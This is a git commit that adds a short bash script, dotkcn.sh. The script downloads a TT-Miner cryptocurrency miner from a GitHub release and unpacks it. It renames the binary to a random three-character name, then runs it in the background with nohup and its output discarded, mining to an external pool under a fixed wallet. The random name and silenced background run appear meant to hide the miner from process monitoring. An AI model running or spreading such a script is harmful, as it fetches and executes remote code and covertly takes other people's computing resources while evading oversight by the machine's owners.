4d9ffc4a6ac976fadfa7580387c8f293cf2dea21
DotAja <142836390+DotAja@users.noreply.github.com>
2024-06-13 03:07:38 +0700

    Create dotkcn.sh

---
+++ dotkcn.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+
+wget -O dot https://github.com/TrailingStop/TT-Miner-beta/releases/download/2024.2.1-beta5/TT-Miner-2024.2.1B5.2.tar.gz
+
+tar xvf dot
+
+cd TT-Miner-2024.2.1B5.2
+
+kolot=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 3 | head -n 1)
+
+mv TT-Miner $kolot
+
+nohup ./$kolot -a FLEX -P kc1qmk8nx9ur8uqvtx5rlhx4wjana5pelq9lgka35f.DOT-$kolot@eu.mpool.live:5271 > /dev/null 2>&1 &
